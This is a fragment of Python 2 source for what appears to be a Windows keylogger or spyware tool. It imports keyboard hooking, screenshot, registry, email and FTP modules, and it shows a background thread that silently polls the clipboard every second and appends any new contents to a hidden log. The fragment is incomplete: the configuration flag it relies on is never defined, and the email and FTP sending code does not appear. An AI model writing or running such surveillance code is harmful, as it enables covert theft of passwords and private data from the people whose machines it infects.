import smtplib, time, os, threading, sys, subprocess
import win32console, win32gui, win32event, win32api, winerror, win32clipboard
from sys import exit; from ftplib import FTP; from urllib2 import urlopen; from shutil import copyfile
from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage; from _winreg import *
try:
    import pythoncom, pyHook, pyautogui
    from pyHook import GetKeyState, HookConstants
except ImportError:
    print "required pyhook, pywin32 and pyautogui"
    exit()






def MonitorClipboard():  # Function to get clipboard data
    global strLogs

    try:  # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""

    strClipDataOld = ""

    while True:
        try:
            win32clipboard.OpenClipboard()  # open clipboard
            strClipData = win32clipboard.GetClipboardData()  # get data
            win32clipboard.CloseClipboard()
        except:  # if the contents are not supported
            strClipData = ""

        if strClipData != strClipDataOld and strClipData != "":
            strLogs += "\n" + "\n" + "* * * * * * Clipboard * * * * * *" + "\n" + strClipData + "\n" + \
                       "* * * * * * Clipboard * * * * * *" + "\n" + "\n"
            strClipDataOld = strClipData
        time.sleep(1)  # check every second

if blnLogClipboard == "True":  # if the user wants to capture clipboard data
    ClipboardThread = threading.Thread(target=MonitorClipboard)
    ClipboardThread.daemon = True
    ClipboardThread.start()
